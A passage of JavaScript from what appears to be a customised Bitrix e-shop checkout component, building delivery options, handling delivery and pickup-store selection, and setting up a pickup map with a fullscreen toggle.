            //                 html: BX.util.htmlspecialchars(currentService.name) + (currentService.price ? " (" + currentService.priceFormatted + ")" : "")
            //             }), currentService.description && currentService.description.length ? '<div class="bx-soa-service-small">' + BX.util.htmlspecialchars(currentService.description) + "</div>" : ""]
            //         })
            //     }
            //     extraServices.push(serviceNode)
            // }
            // return extraServices
            var extraServices = [], brake = false,
                i, currentService, serviceNode, serviceName, input;

            for (i in delivery.EXTRA_SERVICES)
            {
                if (!delivery.EXTRA_SERVICES.hasOwnProperty(i))
                    continue;

                currentService = delivery.EXTRA_SERVICES[i];

                if (!currentService.canUserEditValue)
                    continue;

                if (currentService.editControl.indexOf('this.checked') == -1)
                {
                    serviceName = BX.create('LABEL', {
                        html: BX.util.htmlspecialchars(currentService.name)
                        + (currentService.price ? ' (' + currentService.priceFormatted + ')' : '')
                    });

                    if (i == 0)
                        brake = true;

                    serviceNode = BX.create('DIV', {
                        props: {className: 'form-group bx-soa-pp-field'},
                        html: currentService.editControl
                        + (currentService.description && currentService.description.length
                            ? '<div class="bx-soa-service-small">' + BX.util.htmlspecialchars(currentService.description) + '</div>'
                            : '')
                    });

                    BX.prepend(serviceName, serviceNode);
                    input = serviceNode.querySelector('input[type=text]');
                    if (!input)
                        input = serviceNode.querySelector('select');

                    if (input)
                        BX.addClass(input, 'form-control');
                }
                else
                {
                    serviceNode = BX.create('DIV', {
                        props: {className: 'checkbox'},
                        children: [
                            BX.create('LABEL', {
                                html: currentService.editControl + BX.util.htmlspecialchars(currentService.name)
                                + (currentService.price ? ' (' + currentService.priceFormatted + ')' : '')
                                + (currentService.description && currentService.description.length
                                    ? '<div class="bx-soa-service-small">' + BX.util.htmlspecialchars(currentService.description) + '</div>'
                                    : '')
                            })
                        ]
                    });
                }

                extraServices.push(serviceNode);
            }

            brake && extraServices.unshift(BX.create('BR'));

            return extraServices;
        }, editFadeDeliveryBlock: function () {
            var deliveryContent = this.deliveryBlockNode.querySelector(".bx-soa-section-content"), newContent;
            this.initialized.delivery ? this.opened["bx-soa-delivery"] = !1 : (this.editActiveDeliveryBlock(!1), BX.remove(BX.lastChild(this.deliveryBlockNode)))
        }, createDeliveryItem: function (item,currentGroupDelivery,deliveryNode) {
            // var checked = "Y" == item.CHECKED, deliveryId = parseInt(item.ID), labelNodes = [BX.create("INPUT", {
            //         props: {
            //             id: "ID_DELIVERY_ID_" + deliveryId,
            //             name: "DELIVERY_ID",
            //             type: "radio",
            //             className: "bx-soa-pp-company-checkbox",
            //             value: deliveryId,
            //             checked: checked
            //         }
            //     }), BX.create("LABEL", {
            //         props: {
            //             for: "ID_DELIVERY_ID_" + deliveryId,
            //             className: "bx-soa-pp-company-label properties__title char_name",
            //             lang: "ru"
            //         },
            //         html: "<span>" + ("N" != this.params.SHOW_DELIVERY_PARENT_NAMES ? item.NAME : item.OWN_NAME) + "</span>" + (this.uniqueText(item.DESCRIPTION) && !checked ? "<div class='hint colored_theme_hover_bg-block'><span class='icon colored_theme_hover_bg-el'><i>?</i></span><div class='tooltip'>" + item.DESCRIPTION + "</div></div>" : ""),
            //         events: {click: BX.proxy(this.selectDelivery, this)}
            //     })], deliveryCached = this.deliveryCachedInfo[deliveryId], logotype, label, title, itemInnerNode, itemNode,
            //     costNode, descNode, periodNode, calculateNode, injectNode, bHasPrice = !1;
            // item.PRICE >= 0 || void 0 !== item.DELIVERY_DISCOUNT_PRICE ? (bHasPrice = !0, costNode = BX.create("DIV", {
            //     props: {className: "bx-soa-pp-delivery-cost"},
            //     html: '<div class="bx-soa-pp-list-termin" lang="ru">' + this.params.MESS_PRICE + ':</div><div class="bx-soa-pp-list-description" lang="ru">' + (item.PRICE > 0 ? void 0 !== item.DELIVERY_DISCOUNT_PRICE ? item.DELIVERY_DISCOUNT_PRICE_FORMATED : item.PRICE_FORMATED : this.params.MESS_PRICE_FREE) + "</div>"
            // })) : deliveryCached && (deliveryCached.PRICE >= 0 || void 0 !== deliveryCached.DELIVERY_DISCOUNT_PRICE) && (bHasPrice = !0, costNode = BX.create("DIV", {
            //     props: {className: "bx-soa-pp-delivery-cost"},
            //     html: '<div class="bx-soa-pp-list-termin" lang="ru">' + this.params.MESS_PRICE + ':</div><div class="bx-soa-pp-list-description" lang="ru">' + (deliveryCached.PRICE > 0 ? void 0 !== deliveryCached.DELIVERY_DISCOUNT_PRICE ? deliveryCached.DELIVERY_DISCOUNT_PRICE_FORMATED : deliveryCached.PRICE_FORMATED : this.params.MESS_PRICE_FREE) + "</div>"
            // })), label = BX.create("DIV", {
            //     props: {className: "bx-soa-pp-company-graf-container properties" + (item.CALCULATE_ERRORS || deliveryCached && deliveryCached.CALCULATE_ERRORS ? " bx-bd-waring" : "")},
            //     children: labelNodes
            // }), descNode = BX.create("DIV", {
            //     props: {className: "bx-soa-pp-company-description " + (checked ? "" : "hidden")},
            //     html: item.DESCRIPTION
            // }), injectNode = BX.create("DIV", {
            //     props: {className: "bx-soa-pp-company-inject clearfix hidden"},
            //     html: ""
            // });
            // var bHasPeriod = "PERIOD_TEXT" in item && item.PERIOD_TEXT.length;
            // bHasPeriod && (periodNode = BX.create("DIV", {
            //     props: {className: "bx-soa-pp-delivery-period"},
            //     html: '<div class="bx-soa-pp-list-termin" lang="ru">' + this.params.MESS_PERIOD + ':</div><div class="bx-soa-pp-list-description" lang="ru">' + item.PERIOD_TEXT + "</div>"
            // })).setAttribute("lang", "ru");
            // var bHasCalculate = "CALCULATE_DESCRIPTION" in item && item.CALCULATE_DESCRIPTION.length;
            // return bHasCalculate && (calculateNode = BX.create("DIV", {
            //     props: {className: "bx-soa-pp-delivery-calculate"},
            //     html: '<div class="bx-soa-pp-list-termin" lang="ru">' + this.params.MESS_PRICE + ':</div><div class="bx-soa-pp-list-description" lang="ru">' + item.CALCULATE_DESCRIPTION + "</div>"
            // })).setAttribute("lang", "ru"), itemInnerNode = BX.create("DIV", {
            //     props: {className: "bx-soa-pp-company-inner filter radio bordered rounded3"},
            //     children: [label, title, costNode, periodNode, calculateNode, injectNode, descNode]
            // }), (itemNode = BX.create("DIV", {
            //     props: {className: "bx-soa-pp-company bx-soa-pp-company-item" + (bHasPrice ? " bx-soa-pp-company--hasprice" : "") + (bHasPeriod ? " bx-soa-pp-company--hasperiod" : "") + (bHasCalculate ? " bx-soa-pp-company--hascalculate" : "") + " col-sm-6 col-xs-12"},
            //     children: [itemInnerNode]
            // })).setAttribute("data-id", item.ID), checked && BX.addClass(itemNode, "bx-selected"), checked && this.result.LAST_ORDER_DATA.PICK_UP && (this.lastSelectedDelivery = deliveryId), itemNode
            var checked = item.CHECKED == 'Y',
                deliveryId = parseInt(item.ID),
                labelNodes = [
                    BX.create('INPUT', {
                        props: {
                            id: 'ID_DELIVERY_ID_' + deliveryId,
                            name: 'DELIVERY_ID',
                            type: 'checkbox',
                            className: 'bx-soa-pp-company-checkbox',
                            value: deliveryId,
                            checked: checked,
                        }
                    })
                ],
                deliveryCached = this.deliveryCachedInfo[deliveryId],
                logotype, label, title, itemNode, logoNode;

            logoNode = BX.create('DIV', {props: {className: 'bx-soa-pp-company-image'}});


            labelNodes.push(
                BX.create('SPAN', {
                    props: {
                        className: 'ellipse'
                    },
                    html: '<svg fill="#E1E1E1" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="11.5" fill="white" stroke="#E1E1E1"></circle><circle cx="12" cy="12" r="5"></circle></svg>'
                })
            );


            if (this.params.SHOW_DELIVERY_LIST_NAMES == 'Y')
            {
                title = BX.create('DIV', {
                    props: {className: 'bx-soa-pp-company-smalltitle'},
                    text: item.OWN_NAME
                });
                labelNodes.push(title);
            }

            var labelNodesLabel =
                BX.create('LABEL', {
                    attrs: {'for': 'ID_DELIVERY_ID_' + deliveryId},
                    props: {className: 'orderLabel'},
                    children: labelNodes
                })
            ;

            //labelNodes.appendChild(labelNodesLabel);
            var description, parameters;

            label = BX.create('DIV', {
                props: {
                    className: 'bx-soa-pp-company-graf-container2'
                    + (item.CALCULATE_ERRORS || deliveryCached && deliveryCached.CALCULATE_ERRORS ? ' bx-bd-waring' : '')},
                children: [labelNodesLabel,labelNodes]
            });

            if (this.params.SHOW_DELIVERY_LIST_NAMES == 'Y') {
                title = BX.create('DIV', {
                    props: {className: 'bx-soa-pp-company-smalltitle delivery_id'+deliveryId+' title-5 font-weight-500 col pl-4 pt-1'},
                    text: item.OWN_NAME
                });

                description = BX.create('DIV', {
                    props: {className: 'bx-soa-pp-desc-container2 w-100 pl-5'},
                    html: item.DESCRIPTION
                });
            }

            parameters = BX.create('DIV', {
                props: {className: 'bx-soa-pp-company-parameters  w-100 pl-5'}
            });

            if (item.PRICE >= 0 || typeof item.DELIVERY_DISCOUNT_PRICE !== 'undefined')
            {
                label.appendChild(
                    BX.create('DIV', {
                        props: {className: 'bx-soa-pp-delivery-cost'},
                        children: [
                        BX.create('SPAN', {
                            props: {className: 'title-5 font-weight-bold'},
                            html: typeof item.DELIVERY_DISCOUNT_PRICE !== 'undefined'
                            ? item.DELIVERY_DISCOUNT_PRICE_FORMATED
                            : item.PRICE_FORMATED
                        })
                        ]
                    })
                    );
            }
            else if (deliveryCached && (deliveryCached.PRICE >= 0 || typeof deliveryCached.DELIVERY_DISCOUNT_PRICE !== 'undefined'))
            {
                label.appendChild(
                    BX.create('DIV', {
                        props: {className: 'bx-soa-pp-delivery-cost'},
                        children: [
                        BX.create('SPAN', {
                            html: typeof deliveryCached.DELIVERY_DISCOUNT_PRICE !== 'undefined'
                            ? deliveryCached.DELIVERY_DISCOUNT_PRICE_FORMATED
                            : deliveryCached.PRICE_FORMATED
                        })
                        ]
                    })
                    );
            }

            // label.appendChild(parameters);
            // label.appendChild(description);

            itemNode = BX.create('DIV', {
                props: {className: 'bx-soa-pp-company col-lg-12 col-sm-12 col-xs-12 ' + (item.GROUP == currentGroupDelivery ? "" : "hidden") + (item.GROUP ? " GROUP_"+item.GROUP : " GROUP_ANOTHER")},
                children: [label,parameters],//,description
                events: {click: BX.proxy(this.selectDelivery, this)}
            });

            checked && BX.addClass(itemNode, 'bx-selected');

            if(checked){
                this.editDeliveryInfo(itemNode,item);
            }

            if (checked && this.result.LAST_ORDER_DATA.PICK_UP)
                this.lastSelectedDelivery = deliveryId;

            return itemNode;
        }, editFadeDeliveryContent: function (node) {
            var selectedDelivery = this.getSelectedDelivery(),
                name = "N" != this.params.SHOW_DELIVERY_PARENT_NAMES ? selectedDelivery.NAME : selectedDelivery.OWN_NAME,
                errorNode = this.deliveryHiddenBlockNode.querySelector("div.alert.alert-danger"),
                warningNode = this.deliveryHiddenBlockNode.querySelector("div.alert.alert-warning.alert-show"),
                extraService, logotype, imgSrc, arNodes, i;
            errorNode && errorNode.innerHTML ? node.appendChild(errorNode.cloneNode(!0)) : this.getErrorContainer(node), warningNode && warningNode.innerHTML && node.appendChild(warningNode.cloneNode(!0)), selectedDelivery && selectedDelivery.NAME || node.appendChild(BX.create("STRONG", {text: BX.message("SOA_DELIVERY_SELECT_ERROR")}))
        }, selectDelivery: function (event) {
            // if (this.orderBlockNode) {
            //     var target = event.target || event.srcElement,
            //         actionCompany = BX.findParent(target, {className: "bx-soa-pp-company-inject"}),
            //         actionSection = BX.hasClass(target, "bx-soa-pp-company-item") ? target : BX.findParent(target, {className: "bx-soa-pp-company-item"}),
            //         selectedSection = this.deliveryBlockNode.querySelector(".bx-soa-pp-company-item.bx-selected"),
            //         actionInput, selectedInput;
            //     if (!actionCompany) {
            //         if (BX.hasClass(actionSection, "bx-selected")) return "INPUT" == target.nodeName || "A" == target.nodeName || "LABEL" == target.nodeName ? void 0 : BX.PreventDefault(event);
            //         actionSection && (actionInput = actionSection.querySelector("input[type=radio]"), BX.addClass(actionSection, "bx-selected"), actionInput.checked = !0), selectedSection && (selectedInput = selectedSection.querySelector("input[type=radio]"), BX.removeClass(selectedSection, "bx-selected"), selectedInput.checked = !1), this.isDeliveryChanged = !0, this.sendRequest()
            //     }
            // }
            if (!this.orderBlockNode)
                return;

            var target = event.target || event.srcElement,
            actionSection =  BX.hasClass(target, 'bx-soa-pp-company') ? target : BX.findParent(target, {className: 'bx-soa-pp-company'}),
            selectedSection = this.deliveryBlockNode.querySelector('.bx-soa-pp-company.bx-selected'),
            actionInput, selectedInput;

            if (BX.hasClass(actionSection, 'bx-selected'))
                return BX.PreventDefault(event);

            if (actionSection)
            {
                actionInput = actionSection.querySelector('input[type=checkbox]');
                BX.addClass(actionSection, 'bx-selected');
                actionInput.checked = true;
            }
            if (selectedSection)
            {
                selectedInput = selectedSection.querySelector('input[type=checkbox]');
                BX.removeClass(selectedSection, 'bx-selected');
                selectedInput.checked = false;
            }

            this.sendRequest();
        }, getSelectedDelivery: function () {
            // var deliveryCheckbox = this.deliveryBlockNode.querySelector("input[type=radio][name=DELIVERY_ID]:checked"),
            //     currentDelivery = !1, deliveryId, i;
            // if (deliveryCheckbox || (deliveryCheckbox = this.deliveryHiddenBlockNode.querySelector("input[type=radio][name=DELIVERY_ID]:checked")), deliveryCheckbox || (deliveryCheckbox = this.deliveryHiddenBlockNode.querySelector("input[type=hidden][name=DELIVERY_ID]")), deliveryCheckbox) for (i in deliveryId = deliveryCheckbox.value, this.result.DELIVERY) if (this.result.DELIVERY[i].ID == deliveryId) {
            //     currentDelivery = this.result.DELIVERY[i];
            //     break
            // }
            // return currentDelivery
             var deliveryCheckbox = this.deliveryBlockNode.querySelector('input[type=checkbox][name=DELIVERY_ID]:checked'),
                currentDelivery = false,
                deliveryId, i;

            if (!deliveryCheckbox)
                deliveryCheckbox = this.deliveryHiddenBlockNode.querySelector('input[type=checkbox][name=DELIVERY_ID]:checked');

            if (!deliveryCheckbox)
                deliveryCheckbox = this.deliveryHiddenBlockNode.querySelector('input[type=hidden][name=DELIVERY_ID]');

            if (deliveryCheckbox)
            {
                deliveryId = deliveryCheckbox.value;

                for (i in this.result.DELIVERY)
                {
                    if (this.result.DELIVERY[i].ID == deliveryId)
                    {
                        currentDelivery = this.result.DELIVERY[i];
                        break;
                    }
                }
            }

            return currentDelivery;
        }, activatePickUp: function (deliveryName) {
            this.pickUpBlockNode && this.pickUpHiddenBlockNode && (this.pickUpBlockNode.style.display = "", BX.hasClass(this.pickUpBlockNode, "bx-active") || (BX.addClass(this.pickUpBlockNode, "bx-active"), this.pickUpBlockNode.style.display = ""))
        }, deactivatePickUp: function () {
            this.pickUpBlockNode && this.pickUpHiddenBlockNode && BX.hasClass(this.pickUpBlockNode, "bx-active") && (BX.removeClass(this.pickUpBlockNode, "bx-active"), this.pickUpBlockNode.style.display = "none")
        }, editPickUpBlock: function (active) {
            this.pickUpBlockNode && this.pickUpHiddenBlockNode && BX.hasClass(this.pickUpBlockNode, "bx-active") && this.result.DELIVERY && (this.initialized.pickup = !1, active ? this.editActivePickUpBlock(!0) : this.editFadePickUpBlock(), this.initialized.pickup = !0)
        }, editActivePickUpBlock: function (activeNodeMode) {
            var node = activeNodeMode ? this.pickUpBlockNode : this.pickUpHiddenBlockNode, pickUpContent,
                pickUpContentCol;
            if (this.initialized.pickup) "Y" === this.params.SHOW_NEAREST_PICKUP && this.maps && !this.maps.maxWaitTimeExpired && (this.maps.maxWaitTimeExpired = !0, this.initPickUpPagination(), this.editPickUpList(!0), this.pickUpFinalAction()), this.maps && !this.pickUpMapFocused && (this.pickUpMapFocused = !0, setTimeout(BX.proxy(this.maps.pickUpMapFocusWaiter, this.maps), 200)); else {
                (pickUpContent = node.querySelector(".bx-soa-section-content")) || (pickUpContent = this.getNewContainer(), node.appendChild(pickUpContent)), BX.cleanNode(pickUpContent);
                let notShowMapClass = "Y" === this.params.SHOW_PICKUP_MAP ? "" : "pickup-wrapper--no-map";
                var pickUpListOuter = BX.create("DIV", {props: {className: "bx-soa-pickup-list-outer-wrap scrollblock"}});
                pickUpContentCol = BX.create("DIV", {
                    props: {className: "col-xs-12 pickup-wrapper " + notShowMapClass},
                    children: [pickUpListOuter]
                }), this.editPickUpMap(pickUpContentCol), this.editPickUpLoader(pickUpContentCol), pickUpContent.appendChild(BX.create("DIV", {
                    props: {className: "bx_soa_pickup row"},
                    children: [pickUpContentCol]
                })), "Y" == this.params.SHOW_PICKUP_MAP && "Y" == this.params.SHOW_NEAREST_PICKUP || (this.initPickUpPagination(), this.editPickUpList(!0), this.pickUpFinalAction())
            }
        }, editFadePickUpBlock: function () {
            var pickUpContent = this.pickUpBlockNode.querySelector(".bx-soa-section-content"), newContent;
            this.initialized.pickup || (this.editActivePickUpBlock(!1), BX.remove(BX.lastChild(this.pickUpBlockNode))), newContent = this.getNewContainer(), this.pickUpBlockNode.appendChild(newContent), this.editFadePickUpContent(newContent)
        }, editFadePickUpContent: function (pickUpContainer) {
            var selectedPickUp = this.getSelectedPickUp(), html = "", logotype, imgSrc;
            selectedPickUp && ("Y" == this.params.SHOW_STORES_IMAGES && (html += '<img src="' + (imgSrc = (logotype = this.getImageSources(selectedPickUp, "IMAGE_ID")).src_1x || this.defaultStoreLogo) + '" class="bx-soa-pickup-preview-img">'), html += "<strong>" + BX.util.htmlspecialchars(selectedPickUp.TITLE) + "</strong>", selectedPickUp.ADDRESS && (html += "<br><strong>" + BX.message("SOA_PICKUP_ADDRESS") + ":</strong> " + BX.util.htmlspecialchars(selectedPickUp.ADDRESS)), selectedPickUp.PHONE && (html += "<br><strong>" + BX.message("SOA_PICKUP_PHONE") + ":</strong> " + BX.util.htmlspecialchars(selectedPickUp.PHONE)), selectedPickUp.SCHEDULE && (html += "<br><strong>" + BX.message("SOA_PICKUP_WORK") + ":</strong> " + BX.util.htmlspecialchars(selectedPickUp.SCHEDULE)), selectedPickUp.DESCRIPTION && (html += "<br><strong>" + BX.message("SOA_PICKUP_DESC") + ":</strong> " + BX.util.htmlspecialchars(selectedPickUp.DESCRIPTION)))
        }, getPickUpInfoArray: function (storeIds) {
            if (!storeIds || storeIds.length <= 0) return [];
            var arr = [], i;
            for (i = 0; i < storeIds.length; i++) this.result.STORE_LIST[storeIds[i]] && arr.push(this.result.STORE_LIST[storeIds[i]]);
            return arr
        }, getSelectedPickUp: function () {
            var pickUpInput = BX("BUYER_STORE"), currentPickUp, pickUpId, allStoresList = this.result.STORE_LIST,
                stores, i;
            if (pickUpInput && !(currentPickUp = allStoresList[pickUpId = pickUpInput.value]) && (stores = this.getSelectedDelivery().STORE)) for (i in stores) if (stores.hasOwnProperty(i)) {
                currentPickUp = allStoresList[stores[i]], pickUpInput.setAttribute("value", stores[i]);
                break
            }
            return currentPickUp
        }, checkPickUpShow: function () {
            var currentDelivery = this.getSelectedDelivery(), name, stores;
            currentDelivery && currentDelivery.STORE && currentDelivery.STORE.length && (stores = this.getPickUpInfoArray(currentDelivery.STORE)), stores && stores.length ? (name = "N" != this.params.SHOW_DELIVERY_PARENT_NAMES ? currentDelivery.NAME : currentDelivery.OWN_NAME, currentDelivery.STORE_MAIN = currentDelivery.STORE, this.activatePickUp(name), this.editSection(this.pickUpBlockNode)) : this.deactivatePickUp()
        }, geoLocationSuccessCallback: function (result) {
            var activeStores, currentDelivery = this.getSelectedDelivery();
            currentDelivery && currentDelivery.STORE && (activeStores = this.getPickUpInfoArray(currentDelivery.STORE)), activeStores && activeStores.length >= this.options.pickUpMap.minToShowNearestBlock && result && this.editPickUpRecommendList(result.geoObjects.get(0)), this.initPickUpPagination(), this.editPickUpList(!0), this.pickUpFinalAction()
        }, geoLocationFailCallback: function () {
            this.initPickUpPagination(), this.editPickUpList(!0), this.pickUpFinalAction()
        }, initMaps: function () {
            if (this.maps = BX.Sale.OrderAjaxComponent.Maps.init(this), this.maps) {
                if (this.mapsReady = !0, this.resizeMapContainers(), "Y" === this.params.SHOW_PICKUP_MAP && BX("pickUpMap")) {
                    var currentDelivery = this.getSelectedDelivery();
                    if (currentDelivery && currentDelivery.STORE && currentDelivery.STORE.length) var activeStores = this.getPickUpInfoArray(currentDelivery.STORE);
                    if (activeStores && activeStores.length) {
                        var selected = this.getSelectedPickUp();
                        this.maps.initializePickUpMap(selected), this.maps && !this.pickUpMapFocused && (this.pickUpMapFocused = !0, setTimeout(BX.proxy(this.maps.pickUpMapFocusWaiter, this.maps), 200)), "Y" === this.params.SHOW_NEAREST_PICKUP && this.maps.showNearestPickups(BX.proxy(this.geoLocationSuccessCallback, this), BX.proxy(this.geoLocationFailCallback, this)), this.maps.buildBalloons(activeStores), setTimeout(BX.proxy((function () {
                            BX("pickUpMap").appendChild(BX.create("DIV", {
                                props: {className: "yandex-map__mobile-opener"},
                                events: {
                                    click: BX.proxy((function (e) {
                                        const $pickup = BX("pickUpMap");

                                        function isFullscreen(element) {
                                            return (document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement) == element
                                        }

                                        isFullscreen($pickup) ? document.exitFullscreen() : (this.maps.pickUpMap.container && this.maps.pickUpMap.container.enterFullscreen(), this.maps.pickUpMap.getDiv && this.maps.pickUpMap.getDiv().requestFullscreen()), document.onwebkitfullscreenchange = document.onmsfullscreenchange = document.onmozfullscreenchange = document.onfullscreenchange = function () {
                                            isFullscreen($pickup) ? $pickup.classList.add("is-fullscreen") : $pickup.classList.remove("is-fullscreen")
                                        }, e.stopImmediatePropagation()
                                    }), this)
                                }
                            }))
                        }), this), 200)
                    }
                }
                if ("Y" === this.params.SHOW_MAP_IN_PROPS && BX("propsMap")) {
                    var propsMapData = this.getPropertyMapData();
                    this.maps.initializePropsMap(propsMapData)
                }
            }
        }, getPropertyMapData: function () {
            var currentProperty, locationId, k, data = this.options.propertyMap.defaultMapPosition;
            for (k in this.result.ORDER_PROP.properties) if (this.result.ORDER_PROP.properties.hasOwnProperty(k) && "Y" == (currentProperty = this.result.ORDER_PROP.properties[k]).IS_LOCATION) {
                locationId = currentProperty.ID;
                break
            }
            if (this.locations[locationId] && this.locations[locationId][0] && this.locations[locationId][0].coordinates) {
                currentProperty = this.locations[locationId][0].coordinates;
                var long = parseFloat(currentProperty.LONGITUDE), lat = parseFloat(currentProperty.LATITUDE);
                isNaN(long) || isNaN(lat) || 0 == long || 0 == lat || (data.lon = long, data.lat = lat)
            }
            return data
        }, resizeMapContainers: function () {
            var pickUpMapContainer = BX("pickUpMap"), propertyMapContainer = BX("propsMap"),
                resizeBy = this.propsBlockNode, width, height;
            resizeBy && (pickUpMapContainer || propertyMapContainer) && (width = resizeBy.clientWidth, height = parseInt(width / 16 * 9), "Y" === this.params.SHOW_PICKUP_MAP && pickUpMapContainer && (pickUpMapContainer.style.height = height + "px"), "Y" === this.params.SHOW_MAP_IN_PROPS && propertyMapContainer && (propertyMapContainer.style.height = height + "px"))
        }, editPickUpMap: function (pickUpContent) {
            pickUpContent.appendChild(BX.create("DIV", {
                props: {id: "pickUpMap", className: "bx-yandex-view-layout"},
                style: {width: "100%"}
            }))
        }, editPickUpLoader: function (pickUpContent) {
            pickUpContent.appendChild(BX.create("DIV", {
                props: {id: "pickUpLoader", className: "text-center"},
                children: [BX.create("IMG", {props: {src: this.templateFolder + "/images/loader.gif"}})]
            }))
        }, editPickUpList: function (isNew) {
            if (this.pickUpPagination.currentPage && this.pickUpPagination.currentPage.length) {
                BX.remove(BX("pickUpLoader"));
                var pickUpList = BX.create("DIV", {props: {className: "bx-soa-pickup-list main"}}),
                    buyerStoreInput = BX("BUYER_STORE"), selectedStore, container, i, found = !1, recommendList,
                    selectedDelivery, currentStore, storeNode;
                if (buyerStoreInput && (selectedStore = buyerStoreInput.value), (recommendList = this.pickUpBlockNode.querySelector(".bx-soa-pickup-list.recommend")) || (recommendList = this.pickUpHiddenBlockNode.querySelector(".bx-soa-pickup-list.recommend")), recommendList && recommendList.querySelector(".bx-soa-pickup-list-item.bx-selected")) found = !0; else if ((selectedDelivery = this.getSelectedDelivery()) && selectedDelivery.STORE) for (i = 0; i < selectedDelivery.STORE.length; i++) selectedDelivery.STORE[i] == selectedStore && (found = !0);
                for (i = 0; i < this.pickUpPagination.currentPage.length; i++) (currentStore = this.pickUpPagination.currentPage[i]).ID != selectedStore && 0 != parseInt(selectedStore) && found || (selectedStore = buyerStoreInput.value = currentStore.ID, found = !0), storeNode = this.createPickUpItem(currentStore, {selected: currentStore.ID == selectedStore}), pickUpList.appendChild(storeNode);
                isNew ? ((container = this.pickUpHiddenBlockNode.querySelector(".bx_soa_pickup .bx-soa-pickup-list-outer-wrap")) || (container = this.pickUpBlockNode.querySelector(".bx-soa-pp-company-item")), container.insertBefore(BX.create("DIV", {
                    props: {className: "bx-soa-title-subblock"},
                    html: this.params.MESS_PICKUP_LIST
                }), this.pickUpBlockNode.querySelector(".bx_soa_pickup")), container.querySelector(".bx_soa_pickup .bx-soa-pickup-list-outer-wrap").appendChild(pickUpList)) : (container = this.pickUpBlockNode.querySelector(".bx-soa-pickup-list.main"), BX.insertAfter(pickUpList, container), BX.remove(container)), this.pickUpPagination.show && this.showPagination("pickUp", pickUpList)
            }
        }, pickUpFinalAction: function () {
            var selectedDelivery = this.getSelectedDelivery(), deliveryChanged;
            selectedDelivery && (deliveryChanged = this.lastSelectedDelivery !== parseInt(selectedDelivery.ID), this.lastSelectedDelivery = parseInt(selectedDelivery.ID)), deliveryChanged && this.pickUpBlockNode.id !== this.activeSectionId && (this.pickUpBlockNode.id !== this.activeSectionId && this.editFadePickUpContent(BX.lastChild(this.pickUpBlockNode)), BX.removeClass(this.pickUpBlockNode, "bx-step-completed")), this.maps && this.maps.pickUpFinalAction()
        }, getStoreInfoHtml: function (currentStore) {
            var html = "";
            return currentStore.PHONE && (html += '<div class="prop">' + BX.message("SOA_PICKUP_PHONE") + ": " + BX.util.htmlspecialchars(currentStore.PHONE) + "</div>"), currentStore.SCHEDULE && (html += '<div class="prop">' + BX.message("SOA_PICKUP_WORK") + ": " + BX.util.htmlspecialchars(currentStore.SCHEDULE) + "</div>"), html
        }, createPickUpItem: function (currentStore, options) {
            options = options || {};
            var imgClassName = "bx-soa-pickup-l-item-props", buttonClassName = "bx-soa-pickup-l-item-btn", logoNode,
                logotype, html, storeNode, imgSrc;
            "Y" === this.params.SHOW_STORES_IMAGES ? (logotype = this.getImageSources(currentStore, "IMAGE_ID"), imgSrc = logotype && logotype.src_1x || this.defaultStoreLogo, logoNode = BX.create("IMG", {
                props: {
                    src: imgSrc,
                    className: "bx-soa-pickup-l-item-img"
                }, events: {
                    click: BX.delegate((function (e) {
                        this.popupShow(e, logotype && logotype.src_orig || imgSrc)
                    }), this)
                }
            })) : (imgClassName += " no-image", buttonClassName += " no-image"), html = this.getStoreInfoHtml(currentStore);
            let titleStore = currentStore.TITLE ? currentStore.TITLE + "," : "";
            return storeNode = BX.create("DIV", {
                props: {
                    className: "bx-soa-pickup-list-item",
                    id: "store-" + currentStore.ID
                },
                children: [BX.create("DIV", {
                    props: {className: "bx-soa-pickup-item-info"},
                    children: [BX.create("DIV", {
                        props: {className: "bx-soa-pickup-l-item-adress"},
                        children: options.distance ? [BX.util.htmlspecialchars(titleStore + " " + currentStore.ADDRESS), " ( ~" + options.distance + " " + BX.message("SOA_DISTANCE_KM") + " ) "] : [BX.util.htmlspecialchars(titleStore + " " + currentStore.ADDRESS)]
                    }), BX.create("DIV", {
                        props: {className: imgClassName},
                        children: [BX.create("DIV", {
                            props: {className: "bx-soa-pickup-l-item-desc font_xs"},
                            html: html
                        })]
                    })]
                }), BX.create("DIV", {
                    props: {className: buttonClassName},
                    children: [BX.create("A", {
                        props: {
                            href: "javascript:;",
                            className: "btn btn-sm btn-transparent-border-color"
                        },
                        html: options.selected ? this.params.MESS_SELECTED_PICKUP : this.params.MESS_SELECT_PICKUP,
                        events: {
                            click: BX.delegate((function (event) {
                                this.selectStore(event)
                            }), this)
                        }
                    })]
                })],
                events: {click: BX.proxy(this.selectStore, this)}
            }), options.selected && BX.addClass(storeNode, "bx-selected"), storeNode
        }, editPickUpRecommendList: function (geoLocation) {
            if (this.maps && this.maps.canUseRecommendList() && geoLocation) {
                BX.remove(BX("pickUpLoader"));
                var recommendList = BX.create("DIV", {props: {className: "bx-soa-pickup-list recommend"}}),
                    buyerStoreInput = BX("BUYER_STORE"), selectedDelivery = this.getSelectedDelivery(), i, currentStore,
                    currentStoreId, distance, storeNode, container,
                    recommendedStoreIds = this.maps.getRecommendedStoreIds(geoLocation);
                for (i = 0; i < recommendedStoreIds.length; i++) currentStoreId = recommendedStoreIds[i], currentStore = this.getPickUpInfoArray([currentStoreId])[0], 0 === i && parseInt(selectedDelivery.ID) !== this.lastSelectedDelivery && (buyerStoreInput.value = parseInt(currentStoreId)), distance = this.maps.getDistance(geoLocation, currentStoreId), storeNode = this.createPickUpItem(currentStore, {
                    selected: buyerStoreInput.value === currentStoreId,
                    distance: distance
                }), recommendList.appendChild(storeNode), selectedDelivery.STORE_MAIN && selectedDelivery.STORE_MAIN.splice(selectedDelivery.STORE_MAIN.indexOf(currentStoreId), 1);
                (container = this.pickUpHiddenBlockNode.querySelector(".bx_soa_pickup .bx-soa-pickup-list-outer-wrap")) || (container = this.pickUpBlockNode.querySelector(".bx_soa_pickup .bx-soa-pickup-list-outer-wrap")), container.appendChild(recommendList)
            }
        }, selectStore: function (event) {
            var storeItem, storeInput = BX("BUYER_STORE"), selectedPickUp, storeItemId, i, k, page, target, h1, h2;
            if (BX.type.isString(event)) {
                if (!(storeItem = BX("store-" + event))) {
                    for (i = 0; i < this.pickUpPagination.pages.length; i++) for (page = this.pickUpPagination.pages[i], k = 0; k < page.length; k++) if (page[k].ID == event) {
                        this.showPickUpItemsPage(++i);
                        break
                    }
                    storeItem = BX("store-" + event)
                }
            } else target = event.target || event.srcElement, storeItem = BX.hasClass(target, "bx-soa-pickup-list-item") ? target : BX.findParent(target, {className: "bx-soa-pickup-list-item"});
